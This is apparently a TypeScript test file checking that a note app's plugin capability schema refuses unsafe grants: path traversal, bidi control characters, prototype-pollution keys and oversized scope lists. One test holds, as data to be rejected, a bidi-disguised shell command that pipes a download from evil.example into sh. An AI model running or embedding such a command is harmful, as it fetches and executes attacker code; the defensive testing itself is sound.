import { describe, expect, it } from 'vitest'
import { capabilityText } from '../api/trusted.ts'
import {
  capabilities, capability, capabilityKey, capabilityTypes, type Capability, folderCapabilities, folderCapability,
  installOnlyTypes, isInstallOnly, MAX_CAPABILITIES, MAX_SCOPES_PER_TYPE, MAX_TEXT_LENGTH, text,
} from '../api/capabilities.ts'

const raw = (text: string) => JSON.parse(text)
const many = (n: number, make: (i: number) => string) => Array.from({ length: n }, (_, i) => make(i))

// One of every type
const everyType = [
  { type: 'luoshu.read', paths: ['**'] },
  { type: 'luoshu.write', paths: ['04 - Daily/**'] },
  { type: 'luoshu.list', paths: ['notes/**'] },
  { type: 'net.fetch', hosts: ['example.com'] },
  { type: 'ui.view' },
  { type: 'ui.layout' },
  { type: 'ui.decoration' },
  { type: 'ui.command' },
  { type: 'ui.keys' },
  { type: 'ui.edit', paths: ['**'] },
  { type: 'events.subscribe', topics: ['luoshu.changed', 'search.indexed'] },
  { type: 'storage' },
  { type: 'history', access: 'read', paths: ['**'] },
  { type: 'history', access: 'commit', paths: ['notes/**'] },
  { type: 'exec', commands: [['git', 'status']], env: ['HOME'] },
  { type: 'plugin.call', targets: ['search', 'file-explorer'] },
  { type: 'guard.hook' },
  { type: 'log.read' },
]

describe('the fixed list', () => {
  it('holds ui.view and ui.layout in place of ui.panel and ui.statusBar, core API version 2, and ui.edit', () => {
    expect(capabilityTypes).toEqual([
      'luoshu.read', 'luoshu.write', 'luoshu.list', 'net.fetch', 'ui.view', 'ui.layout', 'ui.decoration', 'ui.command', 'ui.keys',
      'ui.edit', 'events.subscribe', 'storage', 'history', 'exec', 'plugin.call', 'guard.hook', 'log.read',
    ])
  })

  it('has a schema for every listed type and no other', () => {
    expect([...new Set(everyType.map(granted => granted.type))]).toEqual(capabilityTypes)
  })

  // The right to change an open note through the editor, so it names the notes as a write does
  it('takes ui.edit only with paths, judged as any scope is', () => {
    expect(capability.safeParse({ type: 'ui.edit' }).success).toBe(false)
    expect(capability.safeParse({ type: 'ui.edit', paths: ['notes/../a.md'] }).success).toBe(false)
    expect(capabilityText({ type: 'ui.edit', paths: ['notes/**', '**'] })).toBe('ui.edit on "notes/**", "**"')
  })

  it.each(everyType)('takes $type', granted => {
    expect(capability.parse(granted)).toEqual(granted)
  })

  it('takes the whole list at once', () => {
    expect(capabilities.parse(everyType)).toEqual(everyType)
  })

  it.each(['watchdog.control', 'luoshu.delete', 'host.replace', 'ui.*', 'exec.any', '', 'ui.panel', 'ui.statusBar'])('refuses the type %j', type => {
    expect(capability.safeParse({ type }).success).toBe(false)
  })

  it.each(everyType)('refuses $type with an extra field', granted => {
    const extra = 'paths' in granted ? { hosts: ['x'] } : { paths: ['**'] }
    expect(capability.safeParse({ ...granted, ...extra }).success).toBe(false)
  })

  it.each(everyType.filter(granted => Object.keys(granted).length > 1))('refuses $type with no scope', granted => {
    expect(capability.safeParse({ type: granted.type }).success).toBe(false)
  })

  it('gives history paths, so it reaches no note the plugin can not name', () => {
    expect(capability.safeParse({ type: 'history', access: 'read' }).success).toBe(false)
    expect(capability.safeParse({ type: 'history', access: 'rewrite', paths: ['**'] }).success).toBe(false)
  })

  it('keeps the list frozen', () => {
    for (const list of [capabilityTypes, installOnlyTypes]) {
      expect(Object.isFrozen(list)).toBe(true)
      expect(() => (list as unknown as string[]).push('watchdog.control')).toThrow()
    }
  })
})

describe('scopes', () => {
  // The P23 shapes from the attack walk: any text used to pass
  it.each([
    ['luoshu.read', { type: 'luoshu.read', paths: ['**/../x'] }],
    ['luoshu.read', { type: 'luoshu.read', paths: ['C:/**'] }],
    ['luoshu.write', { type: 'luoshu.write', paths: ['notes/{a,b}/**'] }],
    ['luoshu.write', { type: 'luoshu.write', paths: [''] }],
    ['history', { type: 'history', access: 'read', paths: ['/notes/**'] }],
  ])('holds %s paths to the scope grammar', (_type, granted) => {
    expect(capability.safeParse(granted).success).toBe(false)
  })

  it('takes topics as <namespace>.<name> and no wildcard', () => {
    expect(capability.safeParse({ type: 'events.subscribe', topics: ['luoshu.changed'] }).success).toBe(true)
    for (const topic of ['changed', 'luoshu.*', 'luoshu.changed.x', 'Luoshu.changed', '']) {
      expect(capability.safeParse({ type: 'events.subscribe', topics: [topic] }).success).toBe(false)
    }
  })

  it('takes plugin ids as plugin.call targets', () => {
    for (const target of ['my.plugin', 'Search', 'con', '../search', '']) {
      expect(capability.safeParse({ type: 'plugin.call', targets: [target] }).success).toBe(false)
    }
  })

  it('takes exec commands only as non-empty argument arrays', () => {
    // An item with no command at all would hold exec and run nothing, so the any command switch would lift it
    for (const commands of [[], ['git status'], [[]], [['']], [['git', 'a\u0000b']], [[1]]]) {
      expect(capability.safeParse({ type: 'exec', commands, env: [] }).success).toBe(false)
    }
    expect(capability.safeParse({ type: 'exec', commands: [['git', 'status']], env: ['HOME\nPATH'] }).success).toBe(false)
  })

  it('takes hosts as text with no control characters', () => {
    for (const host of ['', 'example.com\r\nx', 'a\u007fb', 'a\u0085b', 'a\u009bb', 'x'.repeat(MAX_TEXT_LENGTH + 1)]) {
      expect(capability.safeParse({ type: 'net.fetch', hosts: [host] }).success).toBe(false)
    }
    expect(capability.safeParse({ type: 'net.fetch', hosts: ['x'.repeat(MAX_TEXT_LENGTH)] }).success).toBe(true)
  })

  // The approval screen puts text in as text, where an override or an isolate shows what follows it in another order
  const bidi = [0x202a, 0x202b, 0x202c, 0x202d, 0x202e, 0x2066, 0x2067, 0x2068, 0x2069]
  it.each(bidi.map(code => code.toString(16)))('refuses the bidi control U+%s in screen text', code => {
    const char = String.fromCharCode(parseInt(code, 16))
    expect(text.safeParse(`a${char}b`).success).toBe(false)
    expect(capability.safeParse({ type: 'net.fetch', hosts: [`example.com${char}`] }).success).toBe(false)
    expect(capability.safeParse({ type: 'exec', commands: [['git', `a${char}b`]], env: [] }).success).toBe(false)
    expect(capability.safeParse({ type: 'exec', commands: [['git']], env: [`HOME${char}`] }).success).toBe(false)
  })

  it('refuses an exec command whose isolate would show it in another order than it runs', () => {
    const command = ['sh', '-c', 'echo done \u2067# ;curl -s https://evil.example/x | sh\u2069']
    expect(capability.safeParse({ type: 'exec', commands: [command], env: [] }).success).toBe(false)
  })

  // Emoji sequences and names in Persian and other scripts need them, so the screens show them instead (#74)
  it('takes the zero-width joiner and non-joiner', () => {
    expect(text.safeParse('\u{1F469}\u200d\u{1F4BB} notes').success).toBe(true)
    expect(text.safeParse('\u0645\u06cc\u200c\u062e\u0648\u0627\u0647\u0645').success).toBe(true)
  })
})

describe('size caps', () => {
  it(`takes ${MAX_SCOPES_PER_TYPE} scopes in one entry and refuses one more`, () => {
    const paths = many(MAX_SCOPES_PER_TYPE, i => `notes/${i}/**`)
    expect(capability.safeParse({ type: 'luoshu.read', paths }).success).toBe(true)
    expect(capability.safeParse({ type: 'luoshu.read', paths: [...paths, 'more/**'] }).success).toBe(false)
  })

  // A grant change holds one capability and a state entry an uncapped list, so this is the only cap there
  it.each([
    ['net.fetch hosts', (n: number) => ({ type: 'net.fetch', hosts: many(n, i => `h${i}.example`) })],
    ['events.subscribe topics', (n: number) => ({ type: 'events.subscribe', topics: many(n, i => `luoshu.t${i}`) })],
    ['exec env', (n: number) => ({ type: 'exec', commands: [['git']], env: many(n, i => `VAR${i}`) })],
    ['exec commands', (n: number) => ({ type: 'exec', commands: many(n, i => `tool${i}`).map(tool => [tool]), env: [] })],
    ['plugin.call targets', (n: number) => ({ type: 'plugin.call', targets: many(n, i => `p${i}`) })],
    ['history paths', (n: number) => ({ type: 'history', access: 'read', paths: many(n, i => `notes/${i}/**`) })],
  ])(`takes ${MAX_SCOPES_PER_TYPE} %s in one entry and refuses one more`, (_name, make) => {
    expect(capability.safeParse(make(MAX_SCOPES_PER_TYPE)).success).toBe(true)
    expect(capability.safeParse(make(MAX_SCOPES_PER_TYPE + 1)).success).toBe(false)
  })

  it('counts scopes per type across the whole list, so splitting a type gets nothing past the cap', () => {
    const half = many(MAX_SCOPES_PER_TYPE / 2, i => `notes/${i}/**`)
    expect(capabilities.safeParse([{ type: 'luoshu.read', paths: half }, { type: 'luoshu.read', paths: half }]).success).toBe(true)
    expect(capabilities.safeParse([
      { type: 'luoshu.read', paths: half }, { type: 'luoshu.read', paths: half }, { type: 'luoshu.read', paths: ['**'] },
    ]).success).toBe(false)
    expect(capabilities.safeParse([
      { type: 'history', access: 'read', paths: [...half, 'a/**'] }, { type: 'history', access: 'commit', paths: half },
    ]).success).toBe(false)
  })

  it('counts each type apart from the others', () => {
    const all = many(MAX_SCOPES_PER_TYPE, i => `notes/${i}/**`)
    expect(capabilities.safeParse([{ type: 'luoshu.read', paths: all }, { type: 'luoshu.write', paths: all }]).success).toBe(true)
  })

  it('counts exec commands and env apart', () => {
    const commands = many(MAX_SCOPES_PER_TYPE, i => `tool${i}`).map(tool => [tool])
    const env = many(MAX_SCOPES_PER_TYPE, i => `VAR${i}`)
    expect(capabilities.safeParse([{ type: 'exec', commands, env }]).success).toBe(true)
    expect(capabilities.safeParse([{ type: 'exec', commands, env }, { type: 'exec', commands: [['one']], env: [] }]).success).toBe(false)
  })

  it(`takes ${MAX_CAPABILITIES} entries and refuses one more`, () => {
    const list = Array.from({ length: MAX_CAPABILITIES }, () => ({ type: 'ui.view' }))
    expect(capabilities.safeParse(list).success).toBe(true)
    expect(capabilities.safeParse([...list, { type: 'ui.view' }]).success).toBe(false)
  })

  it('refuses an argument array past its cap', () => {
    const command = many(MAX_SCOPES_PER_TYPE + 1, i => `arg${i}`)
    expect(capability.safeParse({ type: 'exec', commands: [command], env: [] }).success).toBe(false)
  })
})

describe('install-only types', () => {
  it('marks guard.hook, since guards load only from the install', () => {
    expect(installOnlyTypes).toEqual(['guard.hook'])
    expect(isInstallOnly('guard.hook')).toBe(true)
    expect(capabilityTypes.filter(isInstallOnly)).toEqual(['guard.hook'])
  })

  it('refuses one for a plugin-folder plugin and takes it for an install plugin', () => {
    expect(folderCapability.safeParse({ type: 'guard.hook' }).success).toBe(false)
    expect(capability.safeParse({ type: 'guard.hook' }).success).toBe(true)
    expect(folderCapabilities.safeParse([{ type: 'ui.view' }, { type: 'guard.hook' }]).success).toBe(false)
    expect(capabilities.safeParse([{ type: 'ui.view' }, { type: 'guard.hook' }]).success).toBe(true)
  })

  it.each(everyType.filter(granted => !isInstallOnly(granted.type)))('takes $type from the plugin folder', granted => {
    expect(folderCapability.safeParse(granted).success).toBe(true)
  })
})

describe('keys that reach Object', () => {
  it.each([
    ['__proto__ in an entry', '{"type":"luoshu.read","paths":["**"],"__proto__":{"paths":["**"]}}'],
    ['__proto__ in a scope-less entry', '{"type":"storage","__proto__":{}}'],
    ['constructor in an entry', '{"type":"log.read","constructor":1}'],
    ['prototype in an entry', '{"type":"exec","commands":[["git"]],"env":[],"prototype":1}'],
  ])('refuses %s', (_name, text) => {
    expect(capability.safeParse(raw(text)).success).toBe(false)
    expect(capabilities.safeParse([raw(text)]).success).toBe(false)
  })

  it('refuses one nested in a list entry', () => {
    expect(capabilities.safeParse(raw('[{"type":"ui.view"},{"type":"plugin.call","targets":["search"],"__proto__":{}}]')).success).toBe(false)
  })
})

describe('an item as text', () => {
  it('is the same for two copies of one item whatever order their fields came in, and differs for another item', () => {
    const key = capabilityKey({ type: 'luoshu.read', paths: ['notes/**'] })
    expect(capabilityKey({ paths: ['notes/**'], type: 'luoshu.read' } as Capability)).toBe(key)
    expect(capabilityKey({ type: 'luoshu.read', paths: ['notes/*'] })).not.toBe(key)
    expect(capabilityKey({ type: 'luoshu.write', paths: ['notes/**'] })).not.toBe(key)
  })
})
